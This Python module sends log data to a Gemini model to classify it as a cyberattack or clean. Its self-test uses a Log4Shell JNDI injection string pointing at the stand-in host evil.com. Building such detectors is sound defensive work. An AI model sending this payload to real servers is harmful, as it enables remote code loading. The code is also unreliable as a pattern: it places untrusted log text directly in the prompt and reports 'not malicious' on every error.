import os
import json
import google.generativeai as genai
from dotenv import load_dotenv

# 1. .env dosyasındaki gizli değişkenleri yükle
load_dotenv()

# 2. API Anahtarını yapılandır
api_key = os.getenv("GEMINI_API_KEY")

if not api_key:
    # Hata varsa konsola yaz ama programı kırma
    print("UYARI: API anahtarı bulunamadı. .env dosyasını kontrol et.")
else:
    genai.configure(api_key=api_key)

# --- İŞTE EKSİK OLAN FONKSİYON BU ---
def ask_gemini(threat_pattern):
    """
    Dashboard'dan gelen log verisini analiz eder.
    Geriye JSON formatında string döndürür.
    """
    # API Key yoksa hata dön
    if not api_key:
        return json.dumps({
            "is_malicious": False,
            "type": "HATA",
            "risk_level": "UNKNOWN",
            "explanation": "API Anahtarı (.env) bulunamadı."
        })

    try:
        # 3. Model Seçimi
        # Not: 'gemini-2.5-flash' henüz genel erişimde olmayabilir. 
        # Garanti çalışması için 'gemini-1.5-flash' kullanıyoruz.
        model = genai.GenerativeModel('gemini-1.5-flash')

        # 4. Prompt (Saldırı Analizi İçin)
        prompt = f"""
        Sen kıdemli bir siber güvenlik uzmanısın. Aşağıdaki veri paketini analiz et.
        
        İncelenecek Veri: "{threat_pattern}"
        
        Lütfen SADECE aşağıdaki JSON formatında cevap ver (Markdown veya ek açıklama yazma):
        {{
            "is_malicious": true veya false,
            "type": "Saldırı Tipi (Örn: SQL Injection, XSS, RCE, Log4Shell vb.) veya Temiz",
            "risk_level": "CRITICAL, HIGH, MEDIUM veya LOW",
            "explanation": "Neden zararlı veya güvenli olduğuna dair kısa Türkçe açıklama."
        }}
        """
        
        # 5. İsteği gönder
        response = model.generate_content(prompt)
        text = response.text
        
        # Temizlik: Gemini bazen ```json ... ``` içinde cevap verir.
        clean_text = text.replace("```json", "").replace("```", "").strip()
        
        # Cevabın geçerli JSON olup olmadığını kontrol et
        try:
            json.loads(clean_text) # Test ediyoruz
            return clean_text      # Sorun yoksa döndür
        except json.JSONDecodeError:
            return json.dumps({
                "is_malicious": False,
                "type": "Bilinmiyor",
                "risk_level": "LOW",
                "explanation": f"AI Yanıtı Okunamadı: {clean_text[:50]}..."
            })
            
    except Exception as e:
        return json.dumps({
            "is_malicious": False,
            "type": "API_ERROR",
            "risk_level": "LOW",
            "explanation": f"Bağlantı hatası: {str(e)}"
        })

# --- BU DOSYA TEK BAŞINA ÇALIŞTIRILIRSA TEST ET ---
if __name__ == "__main__":
    print("Test modunda çalışıyor...")
    test_payload = "${jndi:ldap://evil.com}"
    print(ask_gemini(test_payload))